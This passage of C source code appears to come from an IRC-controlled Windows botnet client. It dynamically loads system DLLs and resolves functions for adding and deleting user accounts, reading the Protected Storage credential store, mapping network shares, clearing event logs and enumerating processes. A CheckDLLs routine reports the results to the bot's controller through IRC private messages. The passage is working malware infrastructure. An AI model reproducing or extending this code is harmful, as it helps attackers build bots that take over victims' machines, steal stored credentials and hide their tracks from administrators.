			|| !fNetApiBufferFree || !fNetRemoteTOD || !fNetUserAdd || !fNetUserDel
			|| !fNetUserEnum || !fNetUserGetInfo || !fNetMessageBufferSend)	
	        nonetapi32 = TRUE;
	} else {
		nonetapi32err = GetLastError();
		nonetapi32 = TRUE;
	}

	// dynamically load dnsapi.dll
 	HMODULE dnsapi_dll = LoadLibrary("dnsapi.dll");
    if (dnsapi_dll) {
	 	fDnsFlushResolverCache = (DFRC)GetProcAddress(dnsapi_dll,"DnsFlushResolverCache");
	 	fDnsFlushResolverCacheEntry_A = (DFRCEA)GetProcAddress(dnsapi_dll,"DnsFlushResolverCacheEntry_A");

		if (!fDnsFlushResolverCache || !fDnsFlushResolverCacheEntry_A)
	        nodnsapi = TRUE;
	} else {
		nodnsapierr = GetLastError();
		nodnsapi = TRUE;
	}

	// dynamically load iphlpapi.dll
 	HMODULE iphlpapi_dll = LoadLibrary("iphlpapi.dll");
    if (iphlpapi_dll) {
	 	fGetIpNetTable = (GINT)GetProcAddress(iphlpapi_dll,"GetIpNetTable");
	 	fDeleteIpNetEntry = (DINE)GetProcAddress(iphlpapi_dll,"DeleteIpNetEntry");
		fGetIfTable = (GIT)GetProcAddress(iphlpapi_dll,"GetIfTable");
		fGetTcpTable = (GTT)GetProcAddress(iphlpapi_dll,"GetTcpTable");
		fGetUdpTable = (GUT)GetProcAddress(iphlpapi_dll,"GetUdpTable");

		if (!fGetIpNetTable || !fDeleteIpNetEntry || !fGetIfTable || !fGetUdpTable || !fGetTcpTable)
	        noiphlpapi = TRUE;
		
#ifndef NO_ENETINFO
		fGetNetworkParams = (GNP)GetProcAddress(iphlpapi_dll,"GetNetworkParams");

		if (!fGetNetworkParams)	
	        noiphlpapi = TRUE;
#endif // NO_ENETINFO

	} else {
		noiphlpapierr = GetLastError();
		noiphlpapi = TRUE;
	}

	// dynamically load mpr.dll
 	HMODULE mpr_dll = LoadLibrary("mpr.dll");
    if (mpr_dll) {
	 	fWNetAddConnection2 = (WNAC2)GetProcAddress(mpr_dll,"WNetAddConnection2A");
	 	fWNetAddConnection2W = (WNAC2W)GetProcAddress(mpr_dll,"WNetAddConnection2W");
	 	fWNetCancelConnection2 = (WNCC2)GetProcAddress(mpr_dll,"WNetCancelConnection2A");
	 	fWNetCancelConnection2W = (WNCC2W)GetProcAddress(mpr_dll,"WNetCancelConnection2W");

		if (!fWNetAddConnection2 || !fWNetAddConnection2W 
			|| !fWNetCancelConnection2 || !fWNetCancelConnection2W)	
	        nompr = TRUE;
	} else {
		nomprerr = GetLastError();
		nompr = TRUE;
	}

	// dynamically load shell32.dll
 	HMODULE shell32_dll = LoadLibrary("shell32.dll");
    if (shell32_dll) {
	 	fShellExecute = (SE)GetProcAddress(shell32_dll,"ShellExecuteA");
		fSHChangeNotify = (SHCN)GetProcAddress(shell32_dll,"SHChangeNotify");
 
		if (!fShellExecute || !fSHChangeNotify)
	        noshell32 = TRUE;
	} else {
		noshell32err = GetLastError();
		noshell32 = TRUE;
	}

	// dynamically load odbc32.dll
 	HMODULE odbc32_dll = LoadLibrary("odbc32.dll");
    if (odbc32_dll) {
	 	fSQLDriverConnect = (SQLDC)GetProcAddress(odbc32_dll,"SQLDriverConnect");
	 	fSQLSetEnvAttr = (SQLSEA)GetProcAddress(odbc32_dll,"SQLSetEnvAttr");
	 	fSQLExecDirect = (SQLED)GetProcAddress(odbc32_dll,"SQLExecDirect");
	 	fSQLAllocHandle = (SQLAH)GetProcAddress(odbc32_dll,"SQLAllocHandle");
	 	fSQLFreeHandle = (SQLFH)GetProcAddress(odbc32_dll,"SQLFreeHandle");
	 	fSQLDisconnect = (SQLD)GetProcAddress(odbc32_dll,"SQLDisconnect");
 
		if (!fSQLDriverConnect || !fSQLSetEnvAttr || !fSQLExecDirect
			|| !fSQLAllocHandle || !fSQLFreeHandle || !fSQLDisconnect)
	        noodbc32 = TRUE;
	} else {
		noodbc32err = GetLastError();
		noodbc32 = TRUE;
	}

	// dynamically load psapi.dll
 	HMODULE psapi_dll = LoadLibrary("psapi.dll");
    if (psapi_dll) {
	 	fGetModuleFileNameEx = (GMFNE)GetProcAddress(psapi_dll,"GetModuleFileNameExA");
	 	fGetModuleBaseName = (GMBN)GetProcAddress(psapi_dll,"GetModuleBaseNameA");
	 	fEnumProcessModules = (EPM)GetProcAddress(psapi_dll,"EnumProcessModules");
	 	fEnumProcesses = (EP)GetProcAddress(psapi_dll,"EnumProcesses");
	 	fGetProcessMemoryInfo = (GPMI)GetProcAddress(psapi_dll,"GetProcessMemoryInfo");

		if (!fGetModuleBaseName || !fEnumProcessModules || !fEnumProcesses || !fGetProcessMemoryInfo)
	        nopsapi = TRUE;
	} else {
		nopsapierr = GetLastError();
		nopsapi = TRUE;
	}

#ifndef NO_PSTORE
	// dynamically load pstorec.dll
 	HMODULE pstorec_dll = LoadLibrary("pstorec.dll");
    if (pstorec_dll) {
	 	fPStoreCreateInstance = (PSCI)GetProcAddress(pstorec_dll,"PStoreCreateInstance");

		if (!fPStoreCreateInstance)
	        nopstore = TRUE;
	} else {
		nopstoreerr = GetLastError();
		nopstore = TRUE;
	}
#endif

	// dynamically load shlwapi.dll
 	HMODULE shlwapi_dll = LoadLibrary("shlwapi.dll");
    if (shlwapi_dll) {
	 	fPathRemoveFileSpec = (PRFS)GetProcAddress(shlwapi_dll ,"PathRemoveFileSpecA");

		if (!fPathRemoveFileSpec)
	        noshlwapi = TRUE;
	} else {
		noshlwapierr = GetLastError();
		noshlwapi = TRUE;
	}

	return TRUE;
}

#ifndef NO_DLLTEST
void CheckDLLs(char *target,void *conn)
{
	IRC* irc=(IRC*)conn;

#ifdef _DEBUG
	printf("Advapi32.dll: fClearEventLog: %s\n",fClearEventLog?"TRUE":"FALSE");
	printf("Advapi32.dll: fOpenEventLog: %s\n", fOpenEventLog?"TRUE":"FALSE");
	printf("Advapi32.dll: fCloseEventLog: %s\n",fCloseEventLog?"TRUE":"FALSE");
#endif
	
	if (nokernel32)
		irc->privmsg(target,"Kernel32.dll failed. <%d>", nokernel32err);

	if (nouser32)
		irc->privmsg(target,"User32.dll failed. <%d>", nouser32err);

	if (noadvapi32)
		irc->privmsg(target,"Advapi32.dll failed. <%d>", noadvapi32err);

	if (noadvapi32lsa)
		irc->privmsg(target,"Parts of Advapi32.dll failed. (Lsa Restrict)");

	if (nogdi32)
		irc->privmsg(target,"Gdi32.dll failed. <%d>", nogdi32err);

	if (nows2_32)
		irc->privmsg(target,"Ws2_32.dll failed. <%d>", nows2_32err);

	if (nowininet)
		irc->privmsg(target,"Wininet.dll failed. <%d>", nowinineterr);

	if (noicmp)
		irc->privmsg(target,"Icmp.dll failed. <%d>", noicmperr);

	if (nonetapi32)
		irc->privmsg(target,"Netapi32.dll failed. <%d>", nonetapi32err);

	if (nodnsapi)
		irc->privmsg(target,"Dnsapi.dll failed. <%d>", nodnsapierr);

	if (noiphlpapi)
		irc->privmsg(target,"Iphlpapi.dll failed. <%d>", noiphlpapierr);

	if (noiphlpapinsp)
		irc->privmsg(target,"Parts of Iphlpapi.dll failed. (Netstatp)");

	if (nompr)
		irc->privmsg(target,"Mpr32.dll failed. <%d>", nomprerr);

	if (noshell32)
		irc->privmsg(target,"Shell32.dll failed. <%d>", noshell32err);

	if (noodbc32)
		irc->privmsg(target,"Odbc32.dll failed. <%d>", noodbc32err);

	if (nopsapi)
		irc->privmsg(target,"Psapi.dll failed. <%d>", nopsapierr);

#ifndef NO_PSTORE
	if (nopstore)
		irc->privmsg(target,"PStore.dll failed. <%d>", nopstoreerr);
#endif

	if (noshlwapi)
		irc->privmsg(target,"Shlwapi.dll failed. <%d>", noshlwapierr);

	irc->privmsg(target,"%s DLL test complete.",main_title);
	
	return;
}
#endif // NO_DLLTEST
